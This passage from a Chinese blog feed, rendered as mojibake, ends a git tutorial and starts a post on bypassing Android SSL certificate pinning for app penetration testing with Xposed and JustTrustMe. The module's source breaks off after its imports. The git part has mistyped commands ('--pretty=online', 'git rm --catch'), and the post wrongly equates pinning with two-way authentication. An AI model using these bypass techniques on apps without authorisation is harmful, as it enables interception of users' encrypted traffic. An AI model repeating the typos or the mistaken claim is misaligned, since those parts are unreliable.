class="comment">#æ³¨æ„æ­¤æ—¶çš„åˆ›å»ºåˆ†æ”¯å‘½ä»¤å’Œå‰é¢çš„ç•¥æœ‰ä¸åŒï¼Œè¿™é‡Œçš„åˆ›å»ºè¿˜æœ‰å…³è”çš„æ„æ€ã€‚</span></span><br></pre></td></tr></table></figure>
<p>ä½ çš„å°ä¼™ç›˜æ¨é€å®Œä»–çš„æäº¤åˆ°origin&#x2F;dev ç¢°å·§ä½ ä¹Ÿè¦æ”¹è¯¥åˆ†æ”¯åŒæ ·çš„æ–‡ä»¶å¹¶è¯•å›¾æ¨é€ã€‚è¿™æ—¶å€™å°±ä¼šæ¨é€å¤±è´¥ï¼Œgitä¼šæç¤ºä½ å…ˆgit pull æœ€æ–°çš„ origin&#x2F;devï¼Œç„¶åæœ¬åœ°åˆå¹¶è§£å†³å†²çªåå†æ¨é€ã€‚</p>
<p>å½“ç„¶å¦‚æœä½ æ­¤æ—¶çš„devä¸è¿œç¨‹çš„devè¿˜æ²¡æœ‰å…³è”èµ·æ¥ï¼Œgit pullä¼šæŠ¥é”™ï¼Œé‚£ä½ é¦–å…ˆåº”è¯¥å…³è”å†pull</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> branch --set-upstream-to=origin/dev dev</span><br><span class="line"><span class="variable">$git</span> pull  </span><br><span class="line"><span class="comment">#è®°ä½æ— æ³•pullè®°å¾—çœ‹æ˜¯å¦æŠŠæœ¬åœ°çš„test_bobå¯¹åº”åˆ°äº†è¿œç¨‹çš„test_bob</span></span><br><span class="line"><span class="comment">#git pull å®é™…å°±æ˜¯ä¸ºäº†è¿œç¨‹ç‰ˆæœ¬å’Œæœ¬åœ°ç‰ˆæœ¬åˆå¹¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸­é—´è¦ä¿®æ”¹å†²çª add commit ç„¶å-ã€‹</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> push origin dev</span><br></pre></td></tr></table></figure>

<p>å› æ­¤ï¼Œå¤šäººåä½œçš„å·¥ä½œæ¨¡å¼é€šå¸¸æ˜¯è¿™æ ·ï¼š</p>
<ul>
<li><p>é¦–å…ˆï¼Œå¯ä»¥è¯•å›¾ç”¨<code>git push origin &lt;branch-name&gt;</code>æ¨é€è‡ªå·±çš„ä¿®æ”¹ï¼›</p>
</li>
<li><p>å¦‚æœæ¨é€å¤±è´¥ï¼Œåˆ™å› ä¸ºè¿œç¨‹åˆ†æ”¯æ¯”ä½ çš„æœ¬åœ°æ›´æ–°ï¼Œéœ€è¦å…ˆç”¨git pullè¯•å›¾åˆå¹¶ï¼›</p>
</li>
<li><p>å¦‚æœåˆå¹¶æœ‰å†²çªï¼Œåˆ™è§£å†³å†²çªï¼Œå¹¶åœ¨æœ¬åœ°æäº¤ï¼›</p>
</li>
<li><p>æ²¡æœ‰å†²çªæˆ–è€…è§£å†³æ‰å†²çªåï¼Œå†ç”¨<code>git push origin &lt;branch-name&gt;</code>æ¨é€å°±èƒ½æˆåŠŸï¼</p>
</li>
<li><p>å¦‚æœgit pullæç¤ºno tracking informationï¼Œåˆ™è¯´æ˜æœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯çš„é“¾æ¥å…³ç³»æ²¡æœ‰åˆ›å»ºï¼Œç”¨å‘½ä»¤<code>git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>ã€‚</p>
</li>
<li><p>è¿™å°±æ˜¯å¤šäººåä½œçš„å·¥ä½œæ¨¡å¼ï¼Œä¸€æ—¦ç†Ÿæ‚‰äº†ï¼Œå°±éå¸¸ç®€å•ã€‚</p>
</li>
</ul>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li><p>æŸ¥çœ‹è¿œç¨‹åº“ä¿¡æ¯ï¼Œä½¿ç”¨<code> git remote -v</code>ï¼›</p>
</li>
<li><p>æœ¬åœ°æ–°å»ºçš„åˆ†æ”¯å¦‚æœä¸æ¨é€åˆ°è¿œç¨‹ï¼Œå¯¹å…¶ä»–äººå°±æ˜¯ä¸å¯è§çš„ï¼›</p>
</li>
<li><p>ä»æœ¬åœ°æ¨é€åˆ†æ”¯ï¼Œä½¿ç”¨<code>git push origin branch-name</code>ï¼Œå¦‚æœæ¨é€å¤±è´¥ï¼Œå…ˆç”¨git pullæŠ“å–è¿œç¨‹çš„æ–°æäº¤ï¼›</p>
</li>
<li><p>åœ¨æœ¬åœ°åˆ›å»ºå’Œè¿œç¨‹åˆ†æ”¯å¯¹åº”çš„åˆ†æ”¯ï¼Œä½¿ç”¨<code>git checkout -b branch-name origin/branch-name</code>ï¼Œæœ¬åœ°å’Œè¿œç¨‹åˆ†æ”¯çš„åç§°æœ€å¥½ä¸€è‡´ï¼›</p>
</li>
<li><p>å»ºç«‹æœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯çš„å…³è”ï¼Œä½¿ç”¨<code>git branch --set-upstream branch-name origin/branch-name</code>ï¼›</p>
</li>
<li><p>ä»è¿œç¨‹æŠ“å–åˆ†æ”¯ï¼Œä½¿ç”¨<code>git pull</code>ï¼Œå¦‚æœæœ‰å†²çªï¼Œè¦å…ˆå¤„ç†å†²çªã€‚</p>
</li>
</ul>
<h5 id="æ ‡ç­¾ç®¡ç†"><a href="#æ ‡ç­¾ç®¡ç†" class="headerlink" title="æ ‡ç­¾ç®¡ç†"></a>æ ‡ç­¾ç®¡ç†</h5><p>gitä¸­æ‰“æ ‡ç­¾éå¸¸ç®€å•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> branch</span><br><span class="line">*test-bob</span><br><span class="line"> master</span><br><span class="line"><span class="variable">$git</span> checkout master</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰“æ ‡ç­¾</span></span><br><span class="line"><span class="variable">$git</span> tag v1.0</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾</span></span><br><span class="line"><span class="variable">$git</span> tag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é»˜è®¤æ ‡ç­¾æ‰“åœ¨æœ€æ–°æäº¤çš„commitä¸Šï¼Œæœ‰æ—¶å€™ä½ æƒ³å¾€ä¸Šæ¬¡çš„æäº¤ä¸­æ‰“ä¸Šä¸€ä¸ªæ ‡ç­¾ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŸ¥çœ‹çœ‹æäº¤çš„commit id</span></span><br><span class="line">git <span class="built_in">log</span> --pretty=online --abbrev-commit</span><br><span class="line">ffa9285 (HEAD -&gt; test_bob, tag: hahha2019-12-19, origin/test_bob) 2 modigy fix conflict</span><br><span class="line">e4c1719 2 2 modify</span><br><span class="line">2d8eeb3 sadsa</span><br><span class="line">bfdb7dd d</span><br><span class="line">7f599e8 fix conflict</span><br><span class="line">18e491f lear2 bob modify 03.txt</span><br><span class="line">0922ddd (origin/master, origin/HEAD, master) fix coment</span><br><span class="line">a515f05 master add 02-03</span><br><span class="line">483f6a0 add test_02</span><br><span class="line">ab77e12 add test_01</span><br><span class="line">8661a49 <span class="built_in">rm</span></span><br><span class="line">b8d2486 a git markdown</span><br><span class="line">bf14c12 learn2</span><br><span class="line">e22eedb add a a on line</span><br><span class="line">5da025d modify git to gid</span><br><span class="line">eb4c31e add a readme.md</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ·»åŠ æ ‡ç­¾åˆ° bfdb7dd</span></span><br><span class="line"><span class="variable">$git</span> tag testbfdb7dd bfdb7dd</span><br><span class="line"></span><br><span class="line"><span class="comment">#è€Œä¸”è¿˜å¯ä»¥åˆ›å»ºå¸¦æœ‰è¯´æ˜çš„æ ‡ç­¾ -a æŒ‡å®šæ ‡ç­¾å -m æŒ‡å®šè¯´æ˜æ–‡å­—</span></span><br><span class="line"><span class="variable">$git</span> tag -a v0.1 -m <span class="string">&quot;version 0.1 released&quot;</span> eb4c31e</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä½¿ç”¨git showå¯ä»¥æŸ¥çœ‹tagçš„è¯´æ˜æ–‡å­—</span></span><br><span class="line"><span class="variable">$git</span> show v0.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³¨æ„ï¼šæ ‡ç­¾æ€»æ˜¯å’ŒæŸä¸ªcommitæŒ‚é’©ã€‚å¦‚æœè¿™ä¸ªcommitæ—¢å‡ºç°åœ¨masteråˆ†æ”¯ï¼Œåˆå‡ºç°åœ¨devåˆ†æ”¯ï¼Œé‚£ä¹ˆåœ¨è¿™ä¸¤ä¸ªåˆ†æ”¯ä¸Šéƒ½å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ ‡ç­¾ã€‚</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ ‡ç­¾æ‰“é”™äº†ä¹Ÿå¯ä»¥åˆ é™¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> tag -d v0.1</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºæ ‡ç­¾åªå­˜å‚¨åœ¨æœ¬åœ°ï¼Œä¸ä¼šæ¨é€åˆ°è¿œç¨‹ã€‚æ‰€ä»¥ï¼Œæ‰“é”™çš„æ ‡ç­¾å¯ä»¥åœ¨æœ¬åœ°å®‰å…¨åˆ é™¤ã€‚<br>å¦‚æœéœ€è¦æ¨é€æŸä¸ªæ ‡ç­¾åˆ°è¿œç¨‹ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼š<code>bash git push origin &lt;tagname&gt;</code><br>æˆ–è€…ï¼Œä¸€æ¬¡æ€§æ¨é€å…¨éƒ¨æœªæ¨é€çš„æ ‡ç­¾ï¼š<code>bash $ git push origin --tags</code></p>
<p>å¦‚æœæ¨é€åˆ°è¿œç¨‹å†æƒ³åˆ é™¤å°±ç¨å¾®æœ‰ç‚¹éº»çƒ¦äº†:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å…ˆä»æœ¬åœ°åˆ é™¤</span></span><br><span class="line"><span class="variable">$git</span> tag -d v0.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#å†ä»è¿œç¨‹åˆ é™¤ å‘½ä»¤ä¹Ÿæ˜¯push</span></span><br><span class="line"><span class="variable">$git</span> push origin :refs/tags/v0.1</span><br></pre></td></tr></table></figure>

<h5 id="æ‹¯æ•‘å¼ºè¿«ç—‡"><a href="#æ‹¯æ•‘å¼ºè¿«ç—‡" class="headerlink" title="æ‹¯æ•‘å¼ºè¿«ç—‡"></a>æ‹¯æ•‘å¼ºè¿«ç—‡</h5><p>å¯†ç é…ç½®æ–‡ä»¶è‚¯å®šä¸èƒ½ä¸Šgithubä½†æ˜¯æ¯æ¬¡æäº¤æ—¶éƒ½ä¼šæé†’ä½ æœ‰ä¸€ä¸ªæ–‡ä»¶æœªæäº¤ï¼Œè¿™æ ·å¼ºè¿«ç—‡æ‚£è€…å¾ˆæœ‰å‹åŠ›ï¼Œæ‰€ä»¥gitè§£å†³äº†è¿™ä¸ªï¼Œä½ åªéœ€è¦åˆ›å»ºä¸€ä¸ª.gitignoreæ–‡ä»¶ï¼Œç„¶åç¼–è¾‘å®ƒï¼Œæ ¼å¼å®˜æ–¹å·²ç»ç»™å‡ºï¼š<br><a href="https://github.com/github/gitignore">https://github.com/github/gitignore</a><br>æ¯”å¦‚ï¼Œåœ¨windows:</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># windows</span></span><br><span class="line"><span class="number">777</span>.txt</span><br></pre></td></tr></table></figure>
<p>ç„¶åæŠŠ.gitignoreæ–‡ä»¶æäº¤ç»™ç‰ˆæœ¬åº“å³å¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> add .gitignore</span><br><span class="line"><span class="variable">$git</span> commit -m <span class="string">&quot;add .gitignore&quot;</span></span><br><span class="line"><span class="comment">#æäº¤å¥½åå†æ¬¡gitstatus ä¼šå‘ç°777.txtç›´æ¥å°±è¢«å¿½ç•¥äº†</span></span><br><span class="line"><span class="variable">$git</span> status</span><br></pre></td></tr></table></figure>

<p>æœ‰æ—¶å€™æˆ‘ä»¬å·²ç»æäº¤äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¸Œæœ›ä»¥åä¸è¦å†è¿½è¸ªè¿™ä¸ªæ–‡ä»¶äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> <span class="built_in">rm</span> --catch æ–‡ä»¶å</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç„¶åç¼–è¾‘.gitignore æ·»åŠ è¿›å»æ–‡ä»¶å å¹¶æäº¤åˆ°ç‰ˆæœ¬åº“ ä»æ­¤ä»¥åæ–‡ä»¶çš„ä¿®æ”¹å°±ä¸ä¼šè¢«git statusæç¤ºäº†</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ç»•è¿‡appçš„ssl-pinning</title>
    <url>//posts/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87app%E7%9A%84ssl-pinning/</url>
    <content><![CDATA[<h3 id="ä»€ä¹ˆæ˜¯ssl-pinningï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ssl-pinningï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ssl-pinningï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ssl-pinningï¼Ÿ</h3><p style="text-indent: 2em;">ä¸ºäº†é˜²æ­¢ä¸­é—´äººæ”»å‡»ï¼Œappå¾ˆå¤šé‡‡ç”¨äº†è¯ä¹¦å›ºå®šæŠ€æœ¯ï¼Œå°±æ˜¯è¯ä¹¦çš„åŒå‘è®¤è¯ã€‚  
æˆ‘ä»¬åœ¨burpæŠ“å–æµè§ˆå™¨httpsçš„åŒ…æ—¶ï¼Œæœ‰æ—¶å€™ä¼šå¼¹å‡ºè­¦å‘Šå½“å‰è¯ä¹¦ä¸å¯ä¿¡ï¼Œç„¶åæˆ‘ä»¬æ‰‹åŠ¨å‹¾é€‰ä¿¡ä»»å³å¯è¿›è¡ŒæŠ“åŒ…ï¼ˆè¿™ç§å°±æ˜¯å•å‘éªŒè¯ï¼Œæˆ‘ä»¬å¼ºåˆ¶æœåŠ¡ç«¯æ¥æ”¶æˆ‘ä»¬è‡ªå·±çš„è¯ä¹¦ï¼‰ã€‚
</p>
<p style="text-indent: 2em;">appçš„åŒå‘éªŒè¯å°±æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬çš„è¯ä¹¦å’Œappå†…ç½®åœ¨å®¢æˆ·ç«¯çš„è¯ä¹¦ä¸ä¸€è‡´ï¼Œé‚£ä¹ˆä»–å°±ç›´æ¥æŠ¥é”™æˆ–è€…ç›´æ¥é€€å‡ºã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨æ¸—é€æµ‹è¯•appçš„ä¸šåŠ¡æ—¶éœ€è¦ä¸€ç‚¹æ‰‹æ®µç»•è¿‡sslçš„åŒå‘è®¤è¯ï¼Œç›®å‰ç»•è¿‡ssl-pinningçš„ä¸»è¦æ‰‹æ®µå°±æ˜¯hookå’Œé€†å‘æºç é‡æ–°ä¿®æ”¹ä¿®æ”¹ IPA æ–‡ä»¶ã€æ‰“åŒ…ã€å®‰è£…ã€‚
</p>
<p style="text-indent: 2em;">ç”±äºå¾ˆå¤šappéƒ½è¿›è¡Œäº†åŠ å›ºï¼Œé€†å‘æºç æ˜¯ä¸å¤ªå®¹æ˜“çš„äº‹æƒ…ï¼Œæ‰€ä»¥æ›´å¤šçš„äººé‡‡ç”¨hookå‡½æ•°çš„æ–¹æ³•æ¥è¿›è¡Œssl-pinningçš„ç»•è¿‡ï¼Œæœ¬ç¯‡æ–‡ç« å°±æ˜¯ä»‹ç»ä¸¤ç§è¿‡SSL-unpiningçš„ç»•è¿‡æ–¹æ³•ã€‚
</p>
<span id="more"></span>


<h3 id="ssl-pinningå®ç°æ–¹æ³•"><a href="#ssl-pinningå®ç°æ–¹æ³•" class="headerlink" title="ssl-pinningå®ç°æ–¹æ³•"></a>ssl-pinningå®ç°æ–¹æ³•</h3><p style="text-indent: 2em;">é•¿è¯çŸ­è¯´ï¼Œåªæœ‰çŸ¥é“å®ç°æ–¹æ³•æ‰èƒ½æ›´å¥½çš„ç†è§£hookåŸç†ï¼Œç»å¤§å¤šæ•°éƒ½é‡‡ç”¨çš„æ˜¯Okhttpè¿™ä¸ªåº“ã€‚
åœ¨OKhttpä¸­å®ç° SSL Piningååˆ†ç®€å•ã€‚

<p>å…ˆæ¥çœ‹çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæ˜¯è‹±æ–‡çš„ï¼Œä½†æ˜¯ä¸ºäº†é˜…è¯»å‹å¥½ï¼Œæˆ‘å¤§æ¦‚ç¿»è¯‘äº†ä¸€ä¸‹ğŸ˜‚ï¼š</p>
<blockquote>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œokhttpä¿¡ä»»ä¸»æœºå¹³å°çš„è¯ä¹¦é¢å‘æœºæ„ã€‚æ­¤ç­–ç•¥æœ€å¤§åŒ–äº†è¿æ¥ï¼Œä½†å®ƒä¼šå—åˆ°è¯ä¹¦é¢å‘æœºæ„æ”»å‡»ï¼Œå¦‚2011 DigiNotaræ”»å‡»ã€‚å®ƒè¿˜å‡è®¾æ‚¨çš„httpsæœåŠ¡å™¨çš„è¯ä¹¦æ˜¯ç”±è¯ä¹¦é¢å‘æœºæ„ç­¾åçš„ã€‚<br>ä½¿ç”¨CertificatePinneré™åˆ¶ä¿¡ä»»å“ªäº›è¯ä¹¦å’Œè¯ä¹¦é¢å‘æœºæ„ã€‚è¯ä¹¦å›ºå®šå¢åŠ äº†å®‰å…¨æ€§ï¼Œä½†é™åˆ¶äº†æœåŠ¡å™¨å›¢é˜Ÿæ›´æ–°å…¶TLSè¯ä¹¦çš„èƒ½åŠ›ã€‚æœªç»æœåŠ¡å™¨çš„tlsç®¡ç†å‘˜è®¸å¯ï¼Œè¯·å‹¿ä½¿ç”¨è¯ä¹¦å›ºå®šã€‚</p>
</blockquote>
<p>ä»£ç å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">CertificatePinning</span><span class="params">()</span> &#123;</span><br><span class="line">  client = <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder()</span><br><span class="line">      .certificatePinner(<span class="keyword">new</span> <span class="title class_">CertificatePinner</span>.Builder()</span><br><span class="line">          .add(<span class="string">&quot;publicobject.com&quot;</span>, <span class="string">&quot;sha256/afwiKY3RxoMmLkuRW1l7QsPZTJPwDS2pdDROQjXw8ig=&quot;</span>)</span><br><span class="line">          .build())</span><br><span class="line">      .build();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">  <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">      .url(<span class="string">&quot;https://publicobject.com/robots.txt&quot;</span>)</span><br><span class="line">      .build();</span><br><span class="line"></span><br><span class="line">  <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute();</span><br><span class="line">  <span class="keyword">if</span> (!response.isSuccessful()) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unexpected code &quot;</span> + response);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (Certificate certificate : response.handshake().peerCertificates()) &#123;</span><br><span class="line">    System.out.println(CertificatePinner.pin(certificate));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦å¤–è¿˜æœ‰æ›´ç®€å•çš„ï¼Œç›´æ¥åœ¨AndroidManifest.xml ä¸­æŒ‡å®š(å¥½åƒæœ‰ç‰ˆæœ¬é™åˆ¶ï¼Œä½†æ˜¯ç‰ˆæœ¬æˆ‘å¿˜äº†ğŸ˜‚)ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;network-security-config&gt;</span><br><span class="line">    &lt;domain-config&gt;</span><br><span class="line">        &lt;domain includeSubdomains=&quot;true&quot;&gt;appmattus.com&lt;/domain&gt;</span><br><span class="line">        &lt;pin-set&gt;</span><br><span class="line">            &lt;pin digest=&quot;SHA-256&quot;&gt;4hw5tz+scE+TW+mlai5YipDfFWn1dqvfLG+nU7tq1V8=&lt;/pin&gt;</span><br><span class="line">            &lt;pin digest=&quot;SHA-256&quot;&gt;YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=&lt;/pin&gt;</span><br><span class="line">        &lt;/pin-set&gt;</span><br><span class="line">    &lt;/domain-config&gt;</span><br><span class="line">&lt;/network-security-config&gt;</span><br></pre></td></tr></table></figure>
<p>å…ˆæ¥äº†è§£ä¸‹httpsçš„å·¥ä½œæµç¨‹ï¼š</p>
<blockquote>
<p>åœ¨ä¼šè¯çš„åˆå§‹é˜¶æ®µï¼Œå®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡å‘é€è¯·æ±‚æ—¶ï¼Œé€šè¿‡æ˜æ–‡è¿›è¡Œå‘é€çš„ï¼Œä¸ºäº†é˜²æ­¢ä¿¡æ¯æ³„éœ²ï¼ŒæœåŠ¡ç«¯åœ¨è¿”å›æ—¶åˆ™è¿”å›ä¸€ä¸ªå…¬é’¥å’Œè¯ä¹¦ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦æ˜¯å¦æ˜¯è®¤è¯æœºæ„é¢å‘ï¼Œè¯ä¹¦æ˜¯å¦åœ¨æœ‰æ•ˆæœŸå†…ï¼Œè‹¥æ²¡é—®é¢˜åˆ™è¿›è¡Œä¸‹ä¸€æ¬¡è¯·æ±‚ã€‚åœ¨ä¸‹ä¸€æ¬¡å®¢æˆ·ç«¯å‘é€è¯·æ±‚çš„æ—¶ï¼Œé€šè¿‡å…¬é’¥å¯¹æ ¸å¿ƒæ•°æ®è¿›è¡ŒåŠ å¯†ï¼ŒæœåŠ¡ç«¯åœ¨æ¥æ”¶åˆ°æ•°æ®æ—¶ï¼Œè·å–å¯¹ç§°åŠ å¯†çš„å¯†é’¥ã€‚æ­¤åè¯·æ±‚å°±æ˜¯é€šè¿‡å¯¹ç§°åŠ å¯†çš„å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚</p>
</blockquote>
<p>é‚£æˆ‘ä»¬æ¥æ‹ä¸€éæµç¨‹ï¼Œå®‰è£…appæ—¶appçš„è‡ªå¸¦è¯ä¹¦å°±å®‰ç½®åˆ°äº†æˆ‘ä»¬çš„æ‰‹æœºï¼Œä¸”æ­¤è¯ä¹¦ä¹Ÿå­˜åœ¨åœ¨æœåŠ¡ç«¯ï¼Œå¦å¤–appçš„ä»£ç æ˜¯å¼€å¯äº†SSLpinningçš„ï¼Œå½“æˆ‘ä»¬ç”¨burpæŠ“åŒ…æ—¶éœ€è¦å¯¼å…¥æ‰‹æœºè¯ä¹¦ï¼Œé‚£æˆ‘ä»¬åŠ«æŒhttpsçš„æµé‡å°±æ˜¯ç”¨æˆ‘ä»¬burpçš„è¯ä¹¦åŠ è§£å¯†çš„ï¼Œè€Œburpçš„è¯ä¹¦å’Œappçš„è‡ªå¸¦è¯ä¹¦ä¸ä¸€è‡´ï¼Œæ‰€ä»¥ç›´æ¥downã€‚å¤šè¯´ä¸€å¥ï¼Œè¯ä¹¦çš„ä¸€è‡´æ€§æ˜¯é€šè¿‡sha&#x2F;256æ¥è¿›è¡Œæ¯”è¾ƒçš„ã€‚</p>
<h3 id="xposeç»•è¿‡ssl-pining"><a href="#xposeç»•è¿‡ssl-pining" class="headerlink" title="xposeç»•è¿‡ssl-pining"></a>xposeç»•è¿‡ssl-pining</h3><p>xposeä¸‹è½½åœ°å€ï¼š<a href="https://repo.xposed.info/module/de.robv.android.xposed.installer">https://repo.xposed.info/module/de.robv.android.xposed.installer</a><br>æ³¨æ„ï¼šç›®å‰å¥½åƒä¸æ”¯æŒandroid 9.0ä»¥ä¸Šï¼Œæˆ‘ä¹Ÿä¸ä¼šå†™æ€ä¹ˆå®‰è£…çš„ã€‚æ©ï¼Œæ‡’å¾—å†™ã€‚</p>
<p><strong>JustTrustMeæ¨¡å—ç»•è¿‡ï¼š</strong><br>æ¨¡å—ä¸‹è½½åœ°å€ <a href="https://github.com/Fuzion24/JustTrustMe">https://github.com/Fuzion24/JustTrustMe</a><br>æ­¤æ¨¡å—æ˜¯ä»¥å‰ç”¨çš„æœ€å¤šçš„æ¨¡å—ï¼Œä½†æ˜¯è¿‘æ¥è¶Šæ¥è¶Šä¸å¥½ç”¨äº†ï¼Œç»è¿‡æºç åˆ†æï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> just.trust.me;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.net.http.SslError;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.webkit.SslErrorHandler;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyStore;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyStoreException;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.CertificateException;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.X509Certificate;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyManagementException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.UnrecoverableKeyException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.HostnameVerifier;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.KeyManager;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLContext;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.TrustManager;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.X509TrustManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.ClientConnectionManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.scheme.HostNameResolver;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.scheme.PlainSocketFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.scheme.SchemeRegistry;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.scheme.Scheme;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.DefaultHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.conn.SingleClientConnManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.params.HttpParams;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.callMethod;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.callStaticMethod;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookConstructor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.getObjectField;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.newInstance;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.setObjectField;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span 